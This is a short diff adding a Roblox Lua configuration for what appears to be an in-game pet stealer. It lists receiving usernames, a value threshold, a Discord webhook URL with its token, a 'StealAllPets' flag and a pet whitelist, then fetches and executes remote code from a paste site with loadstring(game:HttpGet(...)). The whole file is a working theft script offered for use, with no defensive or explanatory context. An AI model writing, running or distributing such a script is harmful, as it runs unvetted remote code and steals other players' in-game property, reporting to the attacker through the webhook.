@@ -1,0 +1,11 @@
+
+local Users = {
+    'seanjacob_boto',
+    'Jhaverick21',
+}
+local MinValue = 10000000
+local EveryonePing = "Yes"
+local Webhook = "https://discord.com/api/webhooks/1379753376773832746/-Ei6yKmjr97y2SuxuKdbOZPLikQlAj3m_MKrwTYqCiDy5SX0hP9cUgyjJj7nGnlDBaZi"
+local StealAllPets = true
+local WhitelistPets = {"Red Fox", "Raccoon", "Dragonfly"}
+loadstring(game:HttpGet("https://pastefy.app/qjjlGu0x/raw"))()
